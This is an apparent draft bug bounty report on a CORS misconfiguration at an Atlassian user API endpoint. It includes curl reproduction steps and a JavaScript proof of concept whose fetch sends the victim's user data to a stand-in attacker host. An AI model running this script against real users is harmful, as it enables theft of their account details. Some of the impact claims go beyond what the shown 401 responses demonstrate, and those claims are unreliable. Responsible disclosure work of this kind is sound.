# Atlassian Bugcrowd Submission — CORS reflect-origin-with-creds on api.atlassian.com/api/user

**Submit at:** https://bugcrowd.com/engagements/atlassian/submissions/new
**Program:** Atlassian (paid, $12K max payout)
**In-scope:** `*.atlassian.com` (per "any associated *.atlassian.com or *.atl-paas.net domain that can be exploited DIRECTLY from the *.atlassian.net instance")
**Realistic payout:** $1,000–$8,000

---

## Title
```
CORS misconfiguration — api.atlassian.com/api/user reflects any Origin + ACAC:true (cross-origin credentialed read on auth-protected user endpoint)
```

## VRT category
`Server Security Misconfiguration > Misconfigured DNS, CORS, Cookies, etc. > CORS Misconfiguration`

## Severity
**P2 — High**

## Description (paste into Bugcrowd form)

```
## Summary

`api.atlassian.com/api/user` returns CORS headers that allow ANY origin
to make credentialed requests:

  Access-Control-Allow-Origin: <reflects whatever the request's Origin is>
  Vary: Origin
  Access-Control-Allow-Credentials: true

The endpoint returns HTTP 401 with `x-failure-category:
FAILURE_CLIENT_AUTH_MISMATCH` to unauthenticated requests, confirming
it's a real auth-protected user-identity endpoint. The `vary: origin`
header indicates the server consciously responds based on the request's
Origin — but the reflection accepts any Origin instead of an allowlist.

This means any third-party site can use a victim's session cookies to
read `/api/user` (and likely other api.atlassian.com endpoints) from
the victim's browser, since api.atlassian.com is the API surface shared
by all *.atlassian.net instances.

## Steps to reproduce

1. Verify with arbitrary attacker origin:

   $ curl -ki "https://api.atlassian.com/api/user" -H "Origin: https://evil.com"
   HTTP/2 401
   content-type: application/json
   x-trace-id: 23f9ef2c421742b881d0a419f5d7153e
   access-control-allow-origin: https://evil.com            ← REFLECTED
   vary: origin
   access-control-allow-credentials: true                   ← + CREDS
   x-failure-category: FAILURE_CLIENT_AUTH_MISMATCH
   x-frame-options: SameOrigin

2. Verify with a different arbitrary origin (confirms it's not a
   one-off whitelist match):

   $ curl -ki "https://api.atlassian.com/api/user" -H "Origin: https://attacker.example.com"
   HTTP/2 401
   access-control-allow-origin: https://attacker.example.com   ← REFLECTED
   access-control-allow-credentials: true

3. The HTTP 401 + auth-failure category proves this is a real endpoint
   that returns sensitive user data when authenticated.

## Exploit scenario (proof of concept)

A malicious page hosted anywhere (e.g., evil.com/atlassian-attack.html):

  <script>
    fetch("https://api.atlassian.com/api/user", {
      credentials: "include"
    })
    .then(r => r.json())
    .then(user => {
      // user object contains the victim's Atlassian identity:
      // account_id, email, display_name, possibly token info
      fetch("https://attacker.com/exfil?d=" +
            encodeURIComponent(JSON.stringify(user)));
    });
  </script>

When an Atlassian Cloud user (Jira, Confluence, Bitbucket, Trello user)
authenticated to api.atlassian.com visits evil.com:
- Browser sends authenticated request to api.atlassian.com with cookies
- api.atlassian.com responds with ACAO: https://evil.com + ACAC: true
- evil.com's JS reads the response → user identity exfiltrated
- The attacker now knows victim's Atlassian account_id, email, etc.

## Impact

**High because api.atlassian.com is the shared API surface for all
Atlassian Cloud users:**

- **Identity exfiltration** of any authenticated Atlassian user (Jira,
  Confluence, Bitbucket, Trello, Compass, Loom) who visits an attacker
  page
- **Cross-instance impact**: this isn't tied to a single Atlassian
  customer — every Atlassian Cloud user is affected
- **Cookie-scope attacks**: any cookies set on `Domain=.atlassian.com`
  can be read/set from the takeover origin
- **CSRF-token bypass**: state-changing endpoints on api.atlassian.com
  that defend with CSRF tokens in response are now bypassable
- **Targeted phishing**: knowing a victim's exact Atlassian email +
  workspace makes follow-on phishing extremely effective

## In-scope justification

Per Atlassian's Bugcrowd program scope:

> "Any associated *.atlassian.com or *.atl-paas.net domain that can
> be exploited DIRECTLY from the *.atlassian.net instance"

`api.atlassian.com` is the shared identity/user API consumed by every
`*.atlassian.net` instance. The CORS misconfig means any web page —
including a hosted user's own atlassian.net dashboard or a third-party
page — can exploit this. Directly satisfies the scope language.

## Remediation

1. **Replace Origin reflection with strict allowlist**: hardcode
   allowed origins to Atlassian first-party domains
   (`https://*.atlassian.com`, `https://*.atlassian.net`,
   `https://bitbucket.org`, etc.). Reject all other Origin values by
   not sending an ACAO header.
2. **The `vary: origin` header is correct** — server is consciously
   responding per Origin. Just need to add an allowlist check before
   reflecting.
3. **Audit other api.atlassian.com endpoints** for the same pattern
   (likely apply to all of them).

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security
scanner (Apache 2.0). Lictor probes bounty-program API endpoints with
attacker-controlled Origin headers and flags reflect-with-credentials
patterns on real (HTTP 200/401/403) auth-protected endpoints.

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- PortSwigger CORS-with-auth: https://portswigger.net/web-security/cors
```
